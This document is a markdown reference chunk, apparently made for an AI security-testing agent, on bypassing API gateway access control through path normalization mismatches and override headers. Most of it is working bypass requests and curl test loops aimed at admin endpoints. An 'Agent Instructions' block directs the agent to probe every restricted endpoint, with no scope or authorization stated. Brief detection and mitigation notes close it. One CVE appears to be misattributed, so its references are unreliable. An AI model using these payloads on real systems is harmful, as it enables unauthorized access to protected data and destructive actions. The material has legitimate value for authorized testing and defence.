# Gateway Path Normalization Bypass — Agent Chunk 70a
> Source: gateway-bypass-techniques.md, AWS Security Bulletins, Kong CVE Advisories
> Purpose: Understand how path normalization mismatches between API gateways and backends enable authentication and authorization bypass, and how header injection overrides routing decisions
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Test every authenticated or restricted API endpoint for path normalization mismatches. Send requests with trailing slashes, double slashes, dot segments, semicolons, case variations, and double-URL-encoding. Also inject X-Original-URL, X-Rewrite-URL, and X-HTTP-Method-Override headers. The gateway and backend may normalize paths differently, allowing access to endpoints that should be blocked by gateway-level ACLs.

---

## 1. Path Normalization Mismatch Fundamentals

API gateways enforce access control by matching the request path against policy rules. The backend application independently parses the same path. When the gateway and backend normalize paths differently, an attacker can craft a path that the gateway considers benign (no policy match) but the backend resolves to a protected resource.

### 1.1 The Core Problem

```
Gateway ACL rule: Block /admin/*
Backend routing:  /admin/users → admin panel

Attacker sends:   /admin/./users      → Gateway sees no match → ALLOW
                                       → Backend normalizes → /admin/users → MATCH
```

The gateway performs string matching on the raw path. The backend resolves dot segments per RFC 3986 before routing.

## 2. Bypass Techniques

### 2.1 Trailing Slash Bypass ($12K AWS Bug Bounty)

AWS API Gateway with Lambda authorizers treated `/resource` and `/resource/` as different routes. The authorizer was configured for `/resource` but not `/resource/`. The backend Lambda function treated both identically.

**Payload:**
```
# Blocked by authorizer
GET /api/admin/secrets HTTP/1.1
→ 403 Forbidden

# Bypasses authorizer — trailing slash not in policy
GET /api/admin/secrets/ HTTP/1.1
→ 200 OK (full response from backend)
```

**Affected platforms:** AWS API Gateway, Nginx, HAProxy, Traefik, Envoy (configuration-dependent).

### 2.2 Double Slash Bypass

```
# Blocked
GET /api/internal/config HTTP/1.1
→ 403

# Double slash — gateway regex ^/api/internal/ does not match
GET /api//internal/config HTTP/1.1
→ 200 OK

# Triple slash variant
GET /api///internal/config HTTP/1.1
→ 200 OK
```

Many gateways perform exact prefix matching. `//internal` does not match `/internal`. Backends using path libraries (Python `os.path.normpath`, Go `path.Clean`, Node `path.normalize`) collapse multiple slashes.

### 2.3 Semicolon Path Parameters

Java-based backends (Spring, Tomcat) treat semicolons as path parameter delimiters, while most gateways treat them as part of the path segment.

```
# Blocked
GET /api/admin/users HTTP/1.1
→ 403

# Semicolon injection — gateway sees /api/admin;bypass/users (no policy match)
GET /api/admin;bypass/users HTTP/1.1
→ 200 OK (Tomcat strips ;bypass, routes to /api/admin/users)
```

**Spring-specific variant:**
```
GET /api/admin;jsessionid=fake/users HTTP/1.1
```

### 2.4 Double URL Encoding

The gateway decodes once; the backend decodes again, resolving the path to the protected resource.

```
# %2F = /  (single-encoded)
# %252F = %2F (double-encoded — gateway decodes to %2F, backend decodes to /)

# Blocked
GET /api/admin/secrets HTTP/1.1

# Double-encoded slash
GET /api/admin%252Fsecrets HTTP/1.1
→ Gateway sees /api/admin%2Fsecrets (no policy match)
→ Backend decodes to /api/admin/secrets → 200 OK
```

**Extended double-encoding payloads:**
```
/api/%2561dmin/secrets          → %25 decodes to %, then %61 = 'a' → /api/admin/secrets
/api/admin/%2575sers            → %2575 → %75 → 'u' → /api/admin/users
```

### 2.5 Dot Segment Traversal

```
# Blocked
GET /api/admin/config HTTP/1.1

# Dot segment — gateway does not resolve relative paths
GET /api/public/../admin/config HTTP/1.1
→ Gateway sees /api/public/../admin/config (no /admin/ prefix match)
→ Backend resolves to /api/admin/config → 200 OK
```

**Variants:**
```
GET /api/./admin/config HTTP/1.1
GET /api/admin/sub/../../admin/config HTTP/1.1
GET /anything/../api/admin/config HTTP/1.1
```

### 2.6 Case Variation

Some gateways perform case-sensitive matching while backends are case-insensitive (Windows IIS, some Node.js frameworks).

```
# Blocked
GET /api/Admin/secrets HTTP/1.1

# Case variation
GET /api/ADMIN/secrets HTTP/1.1
GET /api/aDmIn/secrets HTTP/1.1
→ Gateway policy for /api/Admin/* does not match → ALLOW
→ IIS routes case-insensitively → 200 OK
```

## 3. Header Injection Attacks

### 3.1 X-Original-URL / X-Rewrite-URL Override

Some reverse proxies and frameworks (Nginx with `$uri`, Symfony, Laravel) check `X-Original-URL` or `X-Rewrite-URL` headers to determine the actual requested path, overriding the path in the request line.

```
GET /public/home HTTP/1.1
Host: target.com
X-Original-URL: /admin/secrets

→ Gateway evaluates /public/home → ALLOW
→ Backend reads X-Original-URL → routes to /admin/secrets
```

**Symfony/Laravel-specific:**
```
GET / HTTP/1.1
Host: target.com
X-Rewrite-URL: /admin/dashboard
```

### 3.2 X-HTTP-Method-Override

Override HTTP methods to bypass method-specific ACLs.

```
# DELETE blocked by gateway
DELETE /api/users/123 HTTP/1.1
→ 403

# Override via header
POST /api/users/123 HTTP/1.1
X-HTTP-Method-Override: DELETE

→ Gateway allows POST → Backend processes as DELETE
```

**Alternate headers:**
```
X-HTTP-Method: DELETE
X-Method-Override: DELETE
_method=DELETE (query parameter — Rails, Laravel)
```

## 4. CVE References

### 4.1 Kong Gateway CVE-2026-6338 (CVSS 8.1)

**Vulnerability:** Path normalization bypass in Kong Gateway's route matching engine. Kong failed to normalize Unicode fullwidth characters before matching routes against ACL rules.

**Payload:**
```
# Fullwidth slash U+FF0F
GET /api%EF%BC%8Fadmin/secrets HTTP/1.1

→ Kong does not match /api/admin/* rule
→ Upstream backend normalizes fullwidth slash → /api/admin/secrets
```

**Affected versions:** Kong Gateway < 3.9.1, Kong Gateway < 3.8.3.
**Fix:** Upgrade Kong and enable `normalize_uri = true` in kong.conf.

### 4.2 CVE-2021-27306 — HAProxy URI Normalization Bypass

**Vulnerability:** HAProxy ACLs using `path_beg` or `path_dir` did not normalize paths before matching, allowing dot-segment and double-slash bypass.

```
# HAProxy ACL
acl restricted path_beg /admin
http-request deny if restricted

# Bypass
GET /./admin/panel HTTP/1.1
GET //admin/panel HTTP/1.1
```

**Affected versions:** HAProxy < 2.4.
**Fix:** Use `normalize-uri` option or apply path normalization in Lua.

## 5. Reproduction Methodology

### Step 1: Identify Gateway and Backend Stack

```bash
# Fingerprint gateway via headers
curl -sI https://target.com/api/ | grep -iE 'server|x-powered-by|via|x-kong|x-envoy'

# Check for path normalization differences
curl -s -o /dev/null -w '%{http_code}' https://target.com/api/endpoint
curl -s -o /dev/null -w '%{http_code}' https://target.com/api/endpoint/
```

### Step 2: Test Trailing Slash and Double Slash

```bash
for path in "/api/admin" "/api/admin/" "/api//admin" "/api///admin"; do
  echo "$path: $(curl -s -o /dev/null -w '%{http_code}' https://target.com$path)"
done
```

### Step 3: Test Dot Segments

```bash
for path in "/api/./admin" "/api/public/../admin" "/anything/../api/admin"; do
  echo "$path: $(curl -s -o /dev/null -w '%{http_code}' https://target.com$path)"
done
```

### Step 4: Test Semicolons and Encoded Characters

```bash
for path in "/api/admin;test" "/api/admin%2ftest" "/api/admin%252ftest"; do
  echo "$path: $(curl -s -o /dev/null -w '%{http_code}' https://target.com$path)"
done
```

### Step 5: Test Header Injection

```bash
curl -s -o /dev/null -w '%{http_code}' -H "X-Original-URL: /admin" https://target.com/
curl -s -o /dev/null -w '%{http_code}' -H "X-Rewrite-URL: /admin" https://target.com/
curl -s -o /dev/null -w '%{http_code}' -X POST -H "X-HTTP-Method-Override: DELETE" https://target.com/api/users/1
```

### Step 6: Test Case Variations

```bash
for path in "/api/admin" "/api/Admin" "/api/ADMIN" "/api/aDmIn"; do
  echo "$path: $(curl -s -o /dev/null -w '%{http_code}' https://target.com$path)"
done
```

## 6. Detection

**WAF/Log signatures:**
```
# Detect dot segments in URI
regex: /\.\.\// or /\.\/
# Detect double encoding
regex: /%25[0-9a-fA-F]{2}/
# Detect override headers
header_present: X-Original-URL, X-Rewrite-URL, X-HTTP-Method-Override
# Detect semicolons in path
regex: /;[^?]*/
```

## 7. Mitigation

1. **Normalize before matching:** Apply RFC 3986 path normalization (resolve dot segments, collapse slashes, decode percent-encoding) before ACL evaluation.
2. **Reject ambiguous paths:** Return 400 for paths containing `../`, `//`, `;`, or double-encoded characters.
3. **Strip override headers:** Drop `X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override` at the gateway unless explicitly required.
4. **Case-normalize:** Convert paths to lowercase before matching if the backend is case-insensitive.
5. **Test both sides:** Validate that the gateway's view of the path matches the backend's resolved path by logging both.
